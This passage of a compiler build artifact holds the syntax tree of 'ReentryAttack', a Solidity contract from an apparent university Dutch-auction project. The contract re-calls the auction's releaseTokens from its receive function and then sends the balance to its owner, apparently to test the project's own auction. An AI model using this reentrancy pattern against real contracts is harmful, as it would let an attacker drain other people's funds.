                  "expression": {
                    "argumentTypes": null,
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": null,
                        "id": 1313,
                        "name": "auction",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1268,
                        "src": "1443:7:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Auction_$538",
                          "typeString": "contract Auction"
                        }
                      },
                      "id": 1315,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "releaseTokens",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 517,
                      "src": "1443:21:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 1316,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1443:23:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1317,
                  "nodeType": "ExpressionStatement",
                  "src": "1443:23:4"
                }
              ]
            },
            "documentation": null,
            "functionSelector": "8d8f2adb",
            "id": 1319,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdrawTokens",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1311,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1422:2:4"
            },
            "returnParameters": {
              "id": 1312,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1432:0:4"
            },
            "scope": 1343,
            "src": "1399:75:4",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1332,
              "nodeType": "Block",
              "src": "1511:56:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "expression": {
                          "argumentTypes": null,
                          "arguments": [
                            {
                              "argumentTypes": null,
                              "id": 1327,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -28,
                              "src": "1545:4:4",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_ReentryAttack_$1343",
                                "typeString": "contract ReentryAttack"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_ReentryAttack_$1343",
                                "typeString": "contract ReentryAttack"
                              }
                            ],
                            "id": 1326,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "1537:7:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 1325,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "1537:7:4",
                              "typeDescriptions": {
                                "typeIdentifier": null,
                                "typeString": null
                              }
                            }
                          },
                          "id": 1328,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1537:13:4",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        },
                        "id": 1329,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "balance",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1537:21:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "argumentTypes": null,
                        "id": 1322,
                        "name": "owner",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1272,
                        "src": "1522:5:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      },
                      "id": 1324,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1522:14:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256)"
                      }
                    },
                    "id": 1330,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1522:37:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1331,
                  "nodeType": "ExpressionStatement",
                  "src": "1522:37:4"
                }
              ]
            },
            "documentation": null,
            "functionSelector": "3ccfd60b",
            "id": 1333,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdraw",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1320,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1499:2:4"
            },
            "returnParameters": {
              "id": 1321,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1511:0:4"
            },
            "scope": 1343,
            "src": "1482:85:4",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 1341,
              "nodeType": "Block",
              "src": "1628:42:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": null,
                        "id": 1336,
                        "name": "auction",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1268,
                        "src": "1639:7:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Auction_$538",
                          "typeString": "contract Auction"
                        }
                      },
                      "id": 1338,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "releaseTokens",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 517,
                      "src": "1639:21:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 1339,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1639:23:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1340,
                  "nodeType": "ExpressionStatement",
                  "src": "1639:23:4"
                }
              ]
            },
            "documentation": null,
            "id": 1342,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1334,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1608:2:4"
            },
            "returnParameters": {
              "id": 1335,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1628:0:4"
            },
            "scope": 1343,
            "src": "1601:69:4",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 1344,
        "src": "759:914:4"
      }
    ],
    "src": "0:2257:4"
  },
  "legacyAST": {
    "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol",
    "exportedSymbols": {
      "ReentryAttack": [
        1343
      ]
    },
    "id": 1344,
    "license": null,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1264,
        "literals": [
          "solidity",
          "^",
          "0.6",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "0:23:4"
      },
      {
        "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/Auction.sol",
        "file": "./Auction.sol",
        "id": 1265,
        "nodeType": "ImportDirective",
        "scope": 1344,
        "sourceUnit": 539,
        "src": "27:23:4",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/F/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/CypherpunkCoin.sol",
        "file": "./CypherpunkCoin.sol",
        "id": 1266,
        "nodeType": "ImportDirective",
        "scope": 1344,
        "sourceUnit": 1230,
        "src": "52:30:4",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": null,
        "fullyImplemented": true,
        "id": 1343,
        "linearizedBaseContracts": [
          1343
        ],
        "name": "ReentryAttack",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "functionSelector": "7d9f6db5",
            "id": 1268,
            "mutability": "mutable",
            "name": "auction",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1343,
            "src": "789:22:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Auction_$538",
              "typeString": "contract Auction"
            },
            "typeName": {
              "contractScope": null,
              "id": 1267,
              "name": "Auction",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 538,
              "src": "789:7:4",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Auction_$538",
                "typeString": "contract Auction"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "fc0c546a",
            "id": 1270,
            "mutability": "mutable",
            "name": "token",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1343,
            "src": "818:27:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
              "typeString": "contract CypherpunkCoin"
            },
            "typeName": {
              "contractScope": null,
              "id": 1269,
              "name": "CypherpunkCoin",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 1229,
              "src": "818:14:4",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
                "typeString": "contract CypherpunkCoin"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 1272,
            "mutability": "mutable",
            "name": "owner",
            "nodeType": "VariableDeclaration",
            "overrides": null,
            "scope": 1343,
            "src": "852:21:4",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address_payable",
              "typeString": "address payable"
            },
            "typeName": {
              "id": 1271,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "852:15:4",
              "stateMutability": "payable",
              "typeDescriptions": {
                "typeIdentifier": "t_address_payable",
                "typeString": "address payable"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 1296,
              "nodeType": "Block",
              "src": "1026:128:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1283,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1279,
                      "name": "auction",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1268,
                      "src": "1037:7:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Auction_$538",
                        "typeString": "contract Auction"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 1281,
                          "name": "auctionAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1274,
                          "src": "1055:14:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 1280,
                        "name": "Auction",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 538,
                        "src": "1047:7:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Auction_$538_$",
                          "typeString": "type(contract Auction)"
                        }
                      },
                      "id": 1282,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1047:23:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Auction_$538",
                        "typeString": "contract Auction"
                      }
                    },
                    "src": "1037:33:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Auction_$538",
                      "typeString": "contract Auction"
                    }
                  },
                  "id": 1284,
                  "nodeType": "ExpressionStatement",
                  "src": "1037:33:4"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1289,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1285,
                      "name": "token",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1270,
                      "src": "1081:5:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
                        "typeString": "contract CypherpunkCoin"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 1287,
                          "name": "tokenAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1276,
                          "src": "1104:12:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        ],
                        "id": 1286,
                        "name": "CypherpunkCoin",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1229,
                        "src": "1089:14:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_CypherpunkCoin_$1229_$",
                          "typeString": "type(contract CypherpunkCoin)"
                        }
                      },
                      "id": 1288,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1089:28:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
                        "typeString": "contract CypherpunkCoin"
                      }
                    },
                    "src": "1081:36:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_CypherpunkCoin_$1229",
                      "typeString": "contract CypherpunkCoin"
                    }
                  },
                  "id": 1290,
                  "nodeType": "ExpressionStatement",
                  "src": "1081:36:4"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1294,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1291,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1272,
                      "src": "1128:5:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "expression": {
                        "argumentTypes": null,
                        "id": 1292,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -15,
                        "src": "1136:3:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 1293,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1136:10:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "src": "1128:18:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "id": 1295,
                  "nodeType": "ExpressionStatement",
                  "src": "1128:18:4"
                }
              ]
            },
            "documentation": null,
            "id": 1297,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1277,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 1274,
                  "mutability": "mutable",
                  "name": "auctionAddress",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 1297,
                  "src": "965:22:4",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 1273,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "965:7:4",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 1276,
                  "mutability": "mutable",
                  "name": "tokenAddress",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 1297,
                  "src": "989:28:4",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address_payable",
                    "typeString": "address payable"
                  },
                  "typeName": {
                    "id": 1275,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "989:15:4",
                    "stateMutability": "payable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "964:54:4"
            },
            "returnParameters": {
              "id": 1278,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1026:0:4"
            },
            "scope": 1343,
            "src": "953:201:4",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1309,
              "nodeType": "Block",
              "src": "1235:156:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "hexValue": "31303030303030303030303030303030303030",
                          "id": 1305,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "1351:19:4",
                          "subdenomination": null,
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1000000000000000000"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          }
                        ],
                        "expression": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 1300,
                            "name": "auction",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1268,
                            "src": "1246:7:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Auction_$538",
                              "typeString": "contract Auction"
                            }
                          },
                          "id": 1303,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "commit",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 249,
                          "src": "1246:14:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_payable$__$returns$__$",
                            "typeString": "function () payable external"
                          }
                        },
                        "id": 1304,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "value",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1246:20:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_setvalue_pure$_t_uint256_$returns$_t_function_external_payable$__$returns$__$value_$",
                          "typeString": "function (uint256) pure returns (function () payable external)"
                        }
                      },
                      "id": 1306,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1246:135:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 1307,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1246:137:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1308,
                  "nodeType": "ExpressionStatement",
                  "src": "1246:137:4"
                }
              ]
            },
            "documentation": null,
            "functionSelector": "3c7a3aff",
            "id": 1310,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "commit",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1298,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1217:2:4"
            },
            "returnParameters": {
              "id": 1299,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1235:0:4"
            },
            "scope": 1343,
            "src": "1202:189:4",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1318,
              "nodeType": "Block",
              "src": "1432:42:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": null,
                        "id": 1313,
                        "name": "auction",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1268,
                        "src": "1443:7:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Auction_$538",
                          "typeString": "contract Auction"
                        }
                      },
                      "id": 1315,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "releaseTokens",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 517,
                      "src": "1443:21:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 1316,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1443:23:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1317,
                  "nodeType": "ExpressionStatement",
                  "src": "1443:23:4"
                }
              ]
            },
            "documentation": null,
            "functionSelector": "8d8f2adb",
            "id": 1319,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdrawTokens",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1311,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1422:2:4"
            },
            "returnParameters": {
              "id": 1312,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1432:0:4"
            },
            "scope": 1343,
            "src": "1399:75:4",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1332,
              "nodeType": "Block",
              "src": "1511:56:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "expression": {
                          "argumentTypes": null,
                          "arguments": [
                            {
                              "argumentTypes": null,
                              "id": 1327,
                              "name": "this",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -28,
                              "src": "1545:4:4",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_ReentryAttack_$1343",
                                "typeString": "contract ReentryAttack"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_ReentryAttack_$1343",
                                "typeString": "contract ReentryAttack"
                              }
                            ],
                            "id": 1326,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "1537:7:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 1325,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "1537:7:4",
                              "typeDescriptions": {
                                "typeIdentifier": null,
                                "typeString": null
                              }
                            }
                          },
                          "id": 1328,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1537:13:4",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        },
                        "id": 1329,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "balance",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1537:21:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "argumentTypes": null,
                        "id": 1322,
                        "name": "owner",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1272,
                        "src": "1522:5:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      },
                      "id": 1324,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1522:14:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256)"
                      }
                    },
                    "id": 1330,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1522:37:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1331,
                  "nodeType": "ExpressionStatement",
                  "src": "1522:37:4"
                }
              ]
            },
            "documentation": null,
            "functionSelector": "3ccfd60b",
            "id": 1333,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdraw",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1320,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1499:2:4"
            },
            "returnParameters": {
              "id": 1321,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1511:0:4"
            },
            "scope": 1343,
            "src": "1482:85:4",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 1341,
              "nodeType": "Block",
              "src": "1628:42:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": null,
                        "id": 1336,
                        "name": "auction",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1268,
                        "src": "1639:7:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Auction_$538",
                          "typeString": "contract Auction"
                        }
                      },
                      "id": 1338,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "releaseTokens",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 517,
                      "src": "1639:21:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 1339,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1639:23:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1340,
                  "nodeType": "ExpressionStatement",
                  "src": "1639:23:4"
                }
              ]
            },
            "documentation": null,
            "id": 1342,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1334,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1608:2:4"
            },
            "returnParameters": {
              "id": 1335,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1628:0:4"
            },
            "scope": 1343,
            "src": "1601:69:4",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 1344,
        "src": "759:914:4"
      }
    ],
    "src": "0:2257:4"
  },
  "compiler": {
    "name": "solc",
    "version": "0.6.12+commit.27d51765.Emscripten.clang"
  },
  "networks": {},
  "schemaVersion": "3.3.1",
  "updatedAt": "2020-11-03T15:44:57.168Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
